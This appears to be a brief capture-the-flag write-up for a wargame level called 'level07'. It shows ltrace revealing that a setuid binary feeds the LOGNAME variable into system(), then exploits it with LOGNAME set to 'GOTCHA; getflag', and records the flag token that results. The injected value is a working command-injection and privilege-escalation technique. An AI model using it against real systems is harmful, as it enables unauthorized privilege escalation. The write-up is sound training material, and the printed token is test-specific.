# level07

```bash
ls -l
# -rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07

ltrace ./level07
# ...
# getenv("LOGNAME") = "level07"
# ...
# system("/bin/echo level07")
# ...

LOGNAME="GOTCHA; getflag" ./level07
# GOTCHA
# Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```
